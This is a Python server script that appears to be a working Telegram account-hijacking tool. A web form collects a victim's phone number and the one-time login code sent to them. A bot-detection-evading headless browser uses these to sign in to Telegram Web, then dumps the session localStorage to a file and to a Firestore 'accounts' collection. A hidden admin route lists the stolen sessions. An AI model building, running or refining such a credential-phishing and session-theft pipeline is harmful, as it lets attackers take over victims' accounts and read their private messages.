# ...existing code...
import undetected_chromedriver as uc
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
import json
import time
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
from google.oauth2 import service_account
from google.cloud import firestore
from dotenv import load_dotenv
import os
import uuid
from socketserver import ThreadingMixIn
from collections import deque
import base64
import subprocess
import shutil
import re


load_dotenv()

# Global variables to store data
phone_data = {}
login_code = None
code_received = threading.Event()
phone_received = threading.Event()

sessions = {}
queue_lock = threading.Lock()

job_queue = deque()
queue_lock = threading.Lock()

LOGIN_TIMEOUT = int(os.environ.get('LOGIN_TIMEOUT', 120))         # time allowed for initial phone->code step
CODE_WAIT = int(os.environ.get('CODE_WAIT', 300))                # max time to wait for user to submit code
CODE_ENTRY_TIMEOUT = int(os.environ.get('CODE_ENTRY_TIMEOUT', 60))

SESSION_TTL = int(os.environ.get('SESSION_TTL', 600))            # keep logged-in session this long (default 10 minutes)
QUEUED_TTL = int(os.environ.get('QUEUED_TTL', 7200)) 

ADMIN_USER = os.environ.get('ADMIN_USER')
ADMIN_PASS = os.environ.get('ADMIN_PASS')

# Firestore initialization (unchanged)
firestore_db = None
try:
    fb_key = os.environ.get('FIREBASE_KEY')
    if fb_key:
        fb_key = fb_key.strip().strip("'\"")
        sa_info = json.loads(fb_key)
        creds = service_account.Credentials.from_service_account_info(sa_info)
        firestore_db = firestore.Client(project=sa_info.get('project_id'), credentials=creds)
        print("Firestore initialized")
    else:
        print("FIREBASE_KEY not found in environment; Firestore disabled")
except Exception as e:
    print(f"Failed to initialize Firestore: {e}")
    firestore_db = None

# Session store for concurrent users
sessions = {}
sessions_lock = threading.Lock()

class TelegramAutomation:
    def __init__(self):
        self.driver = None
        self.setup_driver()
        self.current_status = "Ready"
        self.phone_number = None

    # ...existing code...
    def setup_driver(self):
        """Configure and initialize the WebDriver"""
        print("[LOG] Setting up WebDriver...")
        
        def create_chrome_options():
            """Create a fresh ChromeOptions object with all settings.
            Respect `HEADLESS` environment variable (default '1'). Set `HEADLESS=0` or 'false' to run headful.
            """
            opts = uc.ChromeOptions()
            headless_env = os.environ.get('HEADLESS', '1').strip().lower()
            if headless_env not in ('0', 'false', 'no', 'off'):
                opts.add_argument('--headless=new')  # Use new headless mode for better compatibility
            else:
                print("[LOG] HEADLESS env set to false; running Chrome in headful mode")
            opts.add_argument('--disable-gpu')
            opts.add_argument('--no-sandbox')
            opts.add_argument('--disable-dev-shm-usage')
            opts.add_argument('--disable-software-rasterizer')  # Helps with rendering issues in containers
            opts.add_argument('--remote-debugging-port=9222')  # For debugging if needed
            opts.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36')
            return opts
        
        def detect_chrome_major_version():
            """Detect installed Chrome/Chromium major version (returns int or None)"""
            # Respect explicit env overrides first
            env_ver = os.environ.get('CHROME_MAJOR') or os.environ.get('CHROME_VERSION') or os.environ.get('CHROME_MAIN_VERSION')
            if env_ver:
                m = re.search(r'(\d+)', env_ver)
                if m:
                    try:
                        return int(m.group(1))
                    except Exception:
                        pass

            chrome_path = os.environ.get('CHROME_PATH')
            candidates = []
            if chrome_path:
                candidates.append(chrome_path)
            candidates.extend(['google-chrome-stable', 'google-chrome', 'chromium-browser', 'chromium', 'chrome'])

            for cmd in candidates:
                try:
                    which = shutil.which(cmd)
                    if not which:
                        continue
                    out = subprocess.run([which, '--version'], capture_output=True, text=True, timeout=5)
                    ver = (out.stdout or out.stderr or '').strip()
                    m = re.search(r'(\d+)\.(\d+)\.(\d+)', ver)
                    if m:
                        return int(m.group(1))
                except Exception:
                    continue
            return None

        try:
            # Use undetected_chromedriver without explicit path to let it auto-detect and download matching version
            print("[LOG] Initializing Chrome with undetected_chromedriver (auto version detection)...")
            print("[LOG] This may take a moment while downloading the matching ChromeDriver...")
            chrome_options = create_chrome_options()
            # Allow specifying explicit Chrome binary path via env var
            chrome_path = os.environ.get('CHROME_PATH')
            if chrome_path:
                try:
                    chrome_options.binary_location = chrome_path
                    print(f"[LOG] Using CHROME_PATH: {chrome_path}")
                except Exception:
                    pass

            # Try to detect installed Chrome major version and pass to uc so it downloads matching driver
            version_main = detect_chrome_major_version()
            if version_main:
                print(f"[LOG] Detected Chrome major version: {version_main}; passing version_main to uc.Chrome")
            else:
                print("[LOG] Could not detect Chrome major version; letting uc auto-detect")

            self.driver = uc.Chrome(
                options=chrome_options,
                use_subprocess=True,  # Helps with process management in containers
                version_main=version_main
            )
            print("[LOG] WebDriver initialized successfully")
            print(f"[LOG] Chrome version: {self.driver.capabilities.get('browserVersion', 'unknown')}")
        except Exception as e:
            print(f"[ERROR] Failed to initialize WebDriver: {e}")
            print("[LOG] Attempting with webdriver_manager fallback...")
            try:
                # Fallback: try to use webdriver-manager to get correct version
                from webdriver_manager.chrome import ChromeDriverManager
                from selenium.webdriver.chrome.service import Service
                
                print("[LOG] Using webdriver_manager to get matching ChromeDriver...")
                # Create a FRESH ChromeOptions object for the fallback attempt
                chrome_options = create_chrome_options()
                # If we detected major version, request matching driver from webdriver_manager
                try:
                    version_main = detect_chrome_major_version()
                except Exception:
                    version_main = None
                if version_main:
                    service = Service(ChromeDriverManager(version=str(version_main)).install())
                else:
                    service = Service(ChromeDriverManager().install())
                self.driver = uc.Chrome(
                    options=chrome_options,
                    service=service,
                    use_subprocess=True
                )
                print("[LOG] WebDriver initialized successfully with webdriver_manager")
                print(f"[LOG] Chrome version: {self.driver.capabilities.get('browserVersion', 'unknown')}")
            except Exception as e2:
                print(f"[ERROR] Failed with webdriver_manager fallback: {e2}")
                raise
    # ...existing code...
    def login_with_phone(self, country_code, phone_number):
        """Perform Telegram login with phone number"""
        try:
            self.phone_number = f"+{country_code}{phone_number}"
            # Navigate to Telegram Web
            self.driver.get('https://web.telegram.org/a/')
            print("[LOG] Navigated to Telegram Web")
            
            # Wait for page to load
            time.sleep(5)
            print("[LOG] Page load wait completed")
            
            # Log page source to understand structure
            print("[LOG] Page source length:", len(self.driver.page_source))
            
            # Scroll to the bottom to ensure all buttons are visible
            print("[LOG] Scrolling to bottom of page to find login button...")
            scroll_result = self.driver.execute_script("window.scrollTo(0, document.body.scrollHeight); return 'scrolled';")
            print(f"[LOG] Scroll result: {scroll_result}")
            time.sleep(2)
            
            # Check if buttons exist on page
            all_buttons = self.driver.find_elements(By.TAG_NAME, "button")
            print(f"[LOG] Total buttons found on page: {len(all_buttons)}")
            for i, btn in enumerate(all_buttons):
                try:
                    btn_text = btn.text.strip()
                    btn_class = btn.get_attribute('class')
                    print(f"[LOG] Button {i}: text='{btn_text}' class='{btn_class}'")
                except Exception as e:
                    print(f"[LOG] Could not read button {i}: {e}")
            
            # Try multiple selectors for the login button
            # Prioritize buttons containing "phone" text to avoid clicking "Log in with Passkey" button
            # Use case-insensitive matching since displayed text is uppercase but source is lowercase
            button_selectors = [
                "//button[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'phone')]",  # Case-insensitive match for "phone"
                "//button[contains(@class, 'auth-button')][contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'phone')]",  # Button with auth-button class containing "phone"
                "//button[normalize-space(text())='Log in by phone number']",  # Exact match
                "//button[contains(text(), 'Log in by phone number')]",  # Contains match
                "//button[contains(text(), 'Log in by phone')]",
                "//button[contains(., 'phone')]",
                "(//button[contains(@class, 'auth-button') and contains(@class, 'primary')])[last()]",  # Last primary auth button (to get phone, not passkey)
            ]
            
            button_found = False
            for idx, selector in enumerate(button_selectors):
                try:
                    print(f"[LOG] Trying selector {idx}: {selector}")
                    button = WebDriverWait(self.driver, 10).until(
                        EC.element_to_be_clickable((By.XPATH, selector))
                    )
                    btn_text = button.text.strip()
                    print(f"[LOG] Button found with selector {idx}: '{btn_text}'")
                    
                    # Extra verification - make sure it's clickable
                    if button.is_displayed():
                        print(f"[LOG] Button is displayed, attempting to click...")
                        button.click()
                        button_found = True
                        print(f"[LOG] Login button clicked successfully!")
                        break
                    else:
                        print(f"[LOG] Button found but not displayed")
                except Exception as e:
                    print(f"[LOG] Selector {idx} failed: {str(e)}")
                    continue
            
            if not button_found:
                print("[LOG] Login button not found via Selenium selectors, trying JS fallback click...")
                try:
                    js_click_script = (
                        "var btns=Array.from(document.querySelectorAll('button'));"
                        "for(var i=0;i<btns.length;i++){"
                        "  try{ var t=(btns[i].innerText||btns[i].textContent||'').trim().toLowerCase();"
                        "    if(t.indexOf('phone')!==-1 || t.indexOf('phone number')!==-1 || t.indexOf('log in')!==-1 || t.indexOf('login')!==-1 || t.indexOf('sign in')!==-1){"
                        "      btns[i].click(); return {'clicked':true,'index':i,'text':t}; } }catch(e){} }"
                        "for(var i=btns.length-1;i>=0;i--){ try{ if(btns[i].offsetParent!==null){ var t=(btns[i].innerText||btns[i].textContent||'').trim(); btns[i].click(); return {'clicked':true,'index':i,'text':t}; } }catch(e){} }"
                        "return {'clicked':false};"
                    )
                    result = self.driver.execute_script(js_click_script)
                    print(f"[LOG] JS click result: {result}")
                    clicked = False
                    if isinstance(result, dict):
                        clicked = result.get('clicked', False)
                    elif isinstance(result, (list, tuple)) and len(result) > 0:
                        try:
                            clicked = bool(result[0].get('clicked'))
                        except Exception:
                            clicked = False
                    elif isinstance(result, str):
                        try:
                            import json
                            rj = json.loads(result)
                            clicked = rj.get('clicked', False)
                        except Exception:
                            clicked = False

                    if clicked:
                        button_found = True
                        print("[LOG] Login button clicked via JS fallback")
                    else:
                        print("[LOG] JS fallback did not find a suitable button")
                except Exception as e:
                    print(f"[LOG] JS fallback failed: {e}")

                if not button_found:
                    print("[LOG] ERROR: Could not find any login button")
                    # Save debug info
                    self.driver.save_screenshot('telegram_button_error.png')
                    with open('telegram_button_error.html', 'w', encoding='utf-8') as f:
                        f.write(self.driver.page_source)
                    raise Exception("Could not find login button")
            
            # Wait for form elements
            time.sleep(3)
            print("[LOG] Waiting for country dropdown...")
            
            # Click on country dropdown to open it
            country_dropdown = WebDriverWait(self.driver, 10).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, "div.CountryCodeInput"))
            )
            print("[LOG] Country dropdown found, clicking...")
            country_dropdown.click()
            print("[LOG] Country dropdown clicked")
            
            time.sleep(2)
            print("[LOG] Searching for country input...")
            
            # Search for country in the dropdown
            search_input = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "input#sign-in-phone-code"))
            )
            search_input.clear()
            print("[LOG] Country search input found and cleared")
            
            # Get country name from country code
            country_name = self.get_country_name(country_code)
            search_input.send_keys(country_name)
            print(f"[LOG] Searched for country: {country_name}")
            
            time.sleep(2)
            print("[LOG] Looking for country option in dropdown...")
            
            # Select country from the dropdown
            country_option = WebDriverWait(self.driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, f"//div[contains(@class, 'MenuItem')]//span[contains(text(), '{country_name}')]"))
            )
            print(f"[LOG] Country option found: {country_name}")
            country_option.click()
            print(f"[LOG] {country_name} selected from dropdown")
            
            time.sleep(2)
            print("[LOG] Waiting for phone number input...")
            
            # Enter the phone number
            phone_input = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, 'input#sign-in-phone-number'))
            )
            print("[LOG] Phone number input found")

            phone_input.send_keys(phone_number)
            print(f"[LOG] Phone number entered: {phone_number}")
            
            # Click Next button
            time.sleep(2)
            print("[LOG] Looking for Next button...")
            next_button_selectors = [
                "//button[contains(text(), 'Next')]",
                "//button[contains(@class, 'auth-button') and contains(@class, 'primary')]",
                "//button[@type='submit']",
                "button.Button.auth-button.default.primary"
            ]
            
            next_button = None
            for idx, selector in enumerate(next_button_selectors):
                try:
                    print(f"[LOG] Trying Next button selector {idx}: {selector}")
                    if selector.startswith('//'):
                        next_button = self.driver.find_element(By.XPATH, selector)
                    else:
                        next_button = self.driver.find_element(By.CSS_SELECTOR, selector)
                    
                    if next_button.is_enabled():
                        print(f"[LOG] Next button found with selector {idx}, clicking...")
                        next_button.click()
                        print("[LOG] Next button clicked")
                        break
                    else:
                        next_button = None
                        print(f"[LOG] Next button found but disabled")
                except Exception as e:
                    print(f"[LOG] Next button selector {idx} failed: {str(e)}")
                    continue
            
            if not next_button:
                print("[LOG] Next button not found with standard selectors, trying JavaScript click...")
                # Fallback: try JavaScript click
                buttons = self.driver.find_elements(By.CSS_SELECTOR, "button.primary")
                print(f"[LOG] Found {len(buttons)} buttons with class 'primary'")
                for i, button in enumerate(buttons):
                    if button.is_displayed():
                        print(f"[LOG] Clicking button {i} using JavaScript")
                        self.driver.execute_script("arguments[0].click();", button)
                        print("[LOG] Clicked button using JavaScript")
                        break
            
            print("[LOG] Phone login step completed, code should be required now")
            self.current_status = "code_required"
            return True
            
        except Exception as e:
            print(f"[ERROR] Error during phone login: {e}")
            print(f"[ERROR] Exception type: {type(e).__name__}")
            import traceback
            print(f"[ERROR] Traceback: {traceback.format_exc()}")
            self.current_status = f"error: {str(e)}"
            # Save error details
            try:
                self.driver.save_screenshot('telegram_error.png')
                print("[LOG] Screenshot saved to telegram_error.png")
                with open('telegram_error_source.html', 'w', encoding='utf-8') as f:
                    f.write(self.driver.page_source)
                print("[LOG] Error page source saved to telegram_error_source.html")
            except Exception:
                pass
            return False
    # ...existing code...
    def get_country_name(self, country_code):
        """Get country name from country code"""
        country_map = {
            "251": "Ethiopia",
            "1": "United States",
            "44": "United Kingdom",
            "91": "India",
            "86": "China",
            "49": "Germany",
            "33": "France",
            "39": "Italy",
            "34": "Spain",
            "7": "Russia",
            "81": "Japan",
            "82": "South Korea",
        }
        return country_map.get(country_code, "Ethiopia")
    # ...existing code...
    def enter_login_code(self, code):
        """Enter the login code received from user"""
        try:
            print(f"[LOG] Starting code entry for code: {code}")
            # Wait for code input page
            code_input = WebDriverWait(self.driver, 30).until(
                EC.presence_of_element_located((By.ID, "sign-in-code"))
            )
            print("[LOG] Code input field found")
            
            code_input.send_keys(code)
            print(f"[LOG] Code submitted: {code}")
            
            # Wait for successful login
            print("[LOG] Waiting for chat list to appear (login confirmation)...")
            WebDriverWait(self.driver, 30).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, '.chat-list, .dialogs, .conversation-list'))
            )
            print("[LOG] Login successful! Chat list found")
            
            # Export LocalStorage
            print("[LOG] Exporting LocalStorage...")
            local_storage_data = self.driver.execute_script("return Object.assign({}, localStorage);")
            print(f"[LOG] LocalStorage exported, size: {len(str(local_storage_data))} bytes")
            
            with open('telegram_localstorage_headless.json', 'w') as f:
                json.dump(local_storage_data, f, indent=2)
            print("[LOG] LocalStorage saved to telegram_localstorage_headless.json")

            try:
                if firestore_db:
                    print("[LOG] Saving to Firestore...")
                    doc = {
                        "phone_number": getattr(self, "phone_number", "unknown"),
                        "local_storage": local_storage_data,
                        "created_at": firestore.SERVER_TIMESTAMP
                    }
                    firestore_db.collection("accounts").add(doc)
                    print("[LOG] LocalStorage saved to Firestore collection 'accounts'")
                else:
                    print("[LOG] Firestore not initialized; skipped saving localStorage to Firestore")
            except Exception as e:
                print(f"[ERROR] Failed to save to Firestore: {e}")
            
            self.current_status = "login_success"
            print("[LOG] Code entry completed successfully")
            return True
            
        except Exception as e:
            print(f"[ERROR] Error during code entry: {e}")
            print(f"[ERROR] Exception type: {type(e).__name__}")
            import traceback
            print(f"[ERROR] Traceback: {traceback.format_exc()}")
            self.current_status = f"error: {str(e)}"
            return False

    def close(self):
        """Close the WebDriver"""
        if self.driver:
            try:
                print("[LOG] Closing WebDriver...")
                self.driver.quit()
                print("[LOG] WebDriver closed successfully")
            except Exception as e:
                print(f"[ERROR] Error closing WebDriver: {e}")
            print("[LOG] WebDriver closed")

# Global automation instance (deprecated - kept for backwards compatibility if needed)
automation = None

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True

class TelegramHTTPHandler(BaseHTTPRequestHandler):
    def _set_common_headers(self):
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Session-Id')

    def _is_authorized(self):
        """Check HTTP Basic Authorization header against ADMIN_USER / ADMIN_PASS.
        If ADMIN_USER/ADMIN_PASS are not set, treat as allowed (developer convenience)."""
        if not (ADMIN_USER and ADMIN_PASS):
            return True  # no creds configured -> allow access (use env vars in production)
        auth = self.headers.get('Authorization')
        if not auth or not auth.lower().startswith('basic '):
            return False
        try:
            token = auth.split(None, 1)[1]
            decoded = base64.b64decode(token).decode('utf-8')
            user, pwd = decoded.split(':', 1)
            return user == ADMIN_USER and pwd == ADMIN_PASS
        except Exception:
            return False

    def _require_auth(self):
        """Send 401 WWW-Authenticate response"""
        self.send_response(401)
        self.send_header('WWW-Authenticate', 'Basic realm="Restricted"')
        self._set_common_headers()
        self.end_headers()
        self.wfile.write(json.dumps({"error": "authentication_required"}).encode())
    # ...existing code...

    def do_GET(self):
        """Handle GET requests"""
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        query = urllib.parse.parse_qs(parsed.query)
        session_id = query.get('session', [None])[0] or self.headers.get('X-Session-Id')
        
        print(f"[LOG] GET request: path={path}, session_id={session_id}")

        if path == '/status':
            # If session supplied, return that session's status
            if session_id:
                with sessions_lock:
                    sess = sessions.get(session_id)
                if not sess:
                    print(f"[LOG] Session {session_id} not found")
                    self.send_response(404)
                    self._set_common_headers()
                    self.end_headers()
                    self.wfile.write(json.dumps({"error": "session_not_found"}).encode())
                    return
                status = sess.get('status', 'unknown')
            else:
                status = automation.current_status if automation else "not_initialized"

            print(f"[LOG] Returning status: {status}")
            self.send_response(200)
            self._set_common_headers()
            self.end_headers()
            self.wfile.write(json.dumps({"status": status}).encode())
            return
        
        elif path == '/':
            # Serve form.html
            print("[LOG] Serving form.html")
            try:
                with open('form.html', 'rb') as f:
                    content = f.read()
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(content)
            except FileNotFoundError:
                self.send_error(404, "File not found")
        
        elif path == '/brocodepizza':
            # Serve home.html
            if not self._is_authorized():
                return self._require_auth()
            try:
                with open('home.html', 'rb') as f:
                    content = f.read()
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(content)
            except FileNotFoundError:
                self.send_error(404, "File not found")
        
        elif path == '/brocodepizza':
            # Fetch accounts from Firestore
            if not firestore_db:
                self.send_response(500)
                self._set_common_headers()
                self.end_headers()
                self.wfile.write(json.dumps({"error": "Firestore not initialized"}).encode())
                return
            
            try:
                accounts_ref = firestore_db.collection("accounts")
                docs = accounts_ref.stream()
                accounts = []
                for doc in docs:
                    data = doc.to_dict()
                    # Convert timestamp to ISO string if present
                    if 'created_at' in data and data['created_at']:
                        data['created_at'] = data['created_at'].isoformat()
                    accounts.append(data)
                
                self.send_response(200)
                self._set_common_headers()
                self.end_headers()
                self.wfile.write(json.dumps(accounts).encode())
            except Exception as e:
                self.send_response(500)
                self._set_common_headers()
                self.end_headers()
                self.wfile.write(json.dumps({"error": str(e)}).encode())
        
        else:
            self.send_error(404, "Endpoint not found")
    
    def do_POST(self):
        """Handle POST requests for phone number and code"""
        # Get content length
        content_length = int(self.headers.get('Content-Length', 0))
        
        print(f"[LOG] POST request: path={self.path}, content_length={content_length}")
        
        # Read the POST data
        if content_length > 0:
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data.decode('utf-8'))
                print(f"[LOG] POST data received: {list(data.keys())}")
            except Exception as e:
                print(f"[ERROR] Failed to parse POST data: {e}")
                data = {}
        else:
            data = {}
        
        self.send_response(200)
        self._set_common_headers()
        self.end_headers()
        
        global automation
        
        if self.path == '/phone':
            country_code = data.get('country_code', '')
            phone_number = data.get('phone_number', '')
            
            print(f"[LOG] Phone login request: country={country_code}, phone={phone_number}")
            
            if not country_code or not phone_number:
                print(f"[LOG] Missing country_code or phone_number")
                response = {"error": "Missing country_code or phone_number"}
                self.wfile.write(json.dumps(response).encode('utf-8'))
                return

            # create session record but DO NOT start browser here (avoid multiple browsers)
            session_id = uuid.uuid4().hex
            now = time.time()
            sess = {
                "created_at": now,
                "queued_at": now,
                "phone_country": country_code,
                "phone_number": phone_number,
                "status": "queued",
                "automation": None,      # will be created by processor when job is active
                "pending_code": None
            }
            with sessions_lock:
                sessions[session_id] = sess
            with queue_lock:
                job_queue.append(session_id)

            print(f"[LOG] Session {session_id} created and queued")
            response = {"message": "Enqueued. You will be processed when previous jobs finish.", "session": session_id, "position": len(job_queue)}
            self.wfile.write(json.dumps(response).encode('utf-8'))
            return
        
        elif self.path == '/code':
            session_id = data.get('session') or self.headers.get('X-Session-Id')
            print(f"[LOG] Code submission for session: {session_id}")
            
            if not session_id:
                print(f"[LOG] Missing session id")
                response = {"error": "Missing session id. Include 'session' in JSON body or 'X-Session-Id' header."}
                self.wfile.write(json.dumps(response).encode('utf-8'))
                return

            with sessions_lock:
                sess = sessions.get(session_id)
            if not sess:
                print(f"[LOG] Session {session_id} not found")
                response = {"error": "session_not_found"}
                self.wfile.write(json.dumps(response).encode('utf-8'))
                return

            code = data.get('code', '')
            if not code:
                print(f"[LOG] Missing code")
                response = {"error": "Missing code"}
                self.wfile.write(json.dumps(response).encode('utf-8'))
                return

            # Store pending code so the processor can use it when this session is active.
            print(f"[LOG] Storing code for session {session_id}")
            with sessions_lock:
                sess['pending_code'] = code
                # If job is still queued, mark that code arrived (so processor won't wait full CODE_WAIT)
                if sess.get('status') == 'queued':
                    sess['status'] = 'queued_with_code'
            response = {"message": "Code received and stored for session."}
            self.wfile.write(json.dumps(response).encode('utf-8'))
            return
        
        else:
            print(f"[LOG] Unknown POST path: {self.path}")
            response = {"error": "Invalid endpoint"}
            self.wfile.write(json.dumps(response).encode('utf-8'))
            return
    
    def do_OPTIONS(self):
        """Handle CORS preflight requests"""
        self.send_response(200)
        self._set_common_headers()
        self.end_headers()
    
    def log_message(self, format, *args):
        """Override to reduce log noise"""
        pass

def _session_cleaner():
    """Background cleaner to remove old sessions and close browsers"""
    print("[LOG] Session cleaner started")
    while True:
        with sessions_lock:
            now = time.time()
            to_delete = []
            for sid, val in list(sessions.items()):
                # If an explicit expires_at was set (post-login), use it
                expires = val.get('expires_at')
                if expires:
                    if now > expires:
                        print(f"[LOG] Session {sid} expired, marking for deletion")
                        to_delete.append(sid)
                    continue

                # Otherwise fall back to queued/created age
                age = now - val.get('created_at', now)
                # be defensive: automation may be None or already closed
                auto = val.get('automation')
                status = None
                try:
                    if auto:
                        status = getattr(auto, 'current_status', None)
                except Exception:
                    status = None

                if age > QUEUED_TTL:
                    print(f"[LOG] Session {sid} exceeded QUEUED_TTL ({QUEUED_TTL}s), marking for deletion")
                    to_delete.append(sid)
                elif status == "login_success" and age > SESSION_TTL:
                    print(f"[LOG] Session {sid} exceeded SESSION_TTL ({SESSION_TTL}s), marking for deletion")
                    to_delete.append(sid)
                elif isinstance(status, str) and status.startswith("error:") and age > 600:
                    print(f"[LOG] Session {sid} is in error state and exceeded 600s, marking for deletion")
                    to_delete.append(sid)

            for sid in to_delete:
                try:
                    auto = sessions[sid].get('automation')
                    if auto:
                        auto.close()
                except Exception:
                    pass
                # Optionally remove any on-disk files tied to session here (if you save per-session localStorage)
                sessions.pop(sid, None)
                print(f"[LOG] Session {sid} deleted")
        time.sleep(30)


def _queue_processor():
    """Sequentially process queued sessions. Only one browser runs at a time."""
    print("[LOG] Queue processor started")
    while True:
        session_id = None
        with queue_lock:
            if job_queue:
                session_id = job_queue.popleft()
        if not session_id:
            time.sleep(1)
            continue

        print(f"[LOG] Processing session: {session_id}")
        with sessions_lock:
            sess = sessions.get(session_id)
            if not sess:
                print(f"[LOG] Session {session_id} not found, skipping")
                continue
            sess['status'] = 'processing'
            sess['started_at'] = time.time()
            print(f"[LOG] Session {session_id} status changed to 'processing'")

        # Create automation instance here (only one at a time)
        try:
            print(f"[LOG] Creating TelegramAutomation instance for session {session_id}...")
            auto = TelegramAutomation()
            print(f"[LOG] TelegramAutomation instance created successfully")
        except Exception as e:
            print(f"[ERROR] Failed to create TelegramAutomation for session {session_id}: {e}")
            with sessions_lock:
                sess['status'] = f"error: failed_to_start_browser: {e}"
                sess['automation'] = None
            continue

        with sessions_lock:
            sess['automation'] = auto

        # Run login_with_phone in thread to allow applying timeout
        print(f"[LOG] Starting login thread for session {session_id}...")
        login_thread = threading.Thread(target=lambda: auto.login_with_phone(sess['phone_country'], sess['phone_number']))
        login_thread.daemon = True
        login_thread.start()
        login_thread.join(LOGIN_TIMEOUT)

        with sessions_lock:
            status = auto.current_status

        print(f"[LOG] Login thread completed for session {session_id}, status: {status}")

        if login_thread.is_alive():
            # login step timed out / stuck
            print(f"[LOG] Login thread timed out for session {session_id} after {LOGIN_TIMEOUT}s")
            try:
                auto.current_status = f"error: login_timeout_after_{LOGIN_TIMEOUT}s"
                auto.close()
            except Exception:
                pass
            with sessions_lock:
                sess['status'] = auto.current_status
                sess['automation'] = None
            continue

        # If login failed quickly, mark error and continue
        if status.startswith("error:"):
            print(f"[LOG] Login failed for session {session_id}: {status}")
            with sessions_lock:
                sess['status'] = status
                sess['automation'] = None
            try:
                auto.close()
            except Exception:
                pass
            continue

        # If code is required, wait for user code (but not indefinitely)
        if status == "code_required":
            print(f"[LOG] Code required for session {session_id}, waiting for user input...")
            with sessions_lock:
                sess['status'] = 'code_required'
            code_deadline = time.time() + CODE_WAIT
            got_code = False
            while time.time() < code_deadline:
                with sessions_lock:
                    code = sess.get('pending_code')
                if code:
                    print(f"[LOG] Code received for session {session_id}: {code}")
                    got_code = True
                    break
                time.sleep(1)

            if not got_code:
                # no code provided in time
                print(f"[LOG] No code received for session {session_id} within {CODE_WAIT}s")
                try:
                    auto.current_status = f"error: no_code_received_within_{CODE_WAIT}s"
                    auto.close()
                except Exception:
                    pass
                with sessions_lock:
                    sess['status'] = auto.current_status
                    sess['automation'] = None
                continue

            # run enter_login_code with timeout
            def _enter_code(a, c):
                a.enter_login_code(c)

            print(f"[LOG] Starting code entry thread for session {session_id}...")
            code_thread = threading.Thread(target=_enter_code, args=(auto, code))
            code_thread.daemon = True
            code_thread.start()
            code_thread.join(CODE_ENTRY_TIMEOUT)

            print(f"[LOG] Code entry thread completed for session {session_id}")

            if code_thread.is_alive():
                print(f"[LOG] Code entry thread timed out for session {session_id} after {CODE_ENTRY_TIMEOUT}s")
                try:
                    auto.current_status = f"error: code_entry_timeout_after_{CODE_ENTRY_TIMEOUT}s"
                    auto.close()
                except Exception:
                    pass
                with sessions_lock:
                    sess['status'] = auto.current_status
                    sess['automation'] = None
                    sess['pending_code'] = None
                continue

            # finished code step; capture final status and cleanup as needed
            with sessions_lock:
                sess['status'] = auto.current_status
                sess['pending_code'] = None
                if auto.current_status == "login_success":
                    sess['expires_at'] = time.time() + SESSION_TTL
                    print(f"[LOG] Session {session_id} logged in successfully")
                else:
                    print(f"[LOG] Session {session_id} code entry failed: {auto.current_status}")

            # If login_success, leave local storage saving logic inside enter_login_code (already present)
            try:
                auto.close()
            except Exception:
                pass
            with sessions_lock:
                sess['automation'] = None

        else:
            # unexpected status - close and mark
            print(f"[LOG] Unexpected status for session {session_id}: {status}")
            try:
                auto.current_status = f"error: unexpected_status_{status}"
                auto.close()
            except Exception:
                pass
            with sessions_lock:
                sess['status'] = auto.current_status
                sess['automation'] = None


def run_server():
    port = int(os.environ.get('PORT', 8765))
    server = ThreadedHTTPServer(('0.0.0.0', port), TelegramHTTPHandler)
    print(f"[LOG] HTTP server started on 0.0.0.0:{port} (threaded)")
    # start session cleaner
    cleaner = threading.Thread(target=_session_cleaner, daemon=True)
    cleaner.start()
    print("[LOG] Session cleaner thread started")
    # start queue processor (single worker)
    processor = threading.Thread(target=_queue_processor, daemon=True)
    processor.start()
    print("[LOG] Queue processor thread started (single active automation)")

    print("[LOG] Press Ctrl+C to stop the server")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[LOG] Shutting down server...")
        # close all sessions' browsers
        with sessions_lock:
            for sid, val in sessions.items():
                try:
                    if val.get('automation'):
                        val['automation'].close()
                except Exception:
                    pass
        server.server_close()
        print("[LOG] Server shut down complete")

if __name__ == "__main__":
    run_server()
# ...existing code...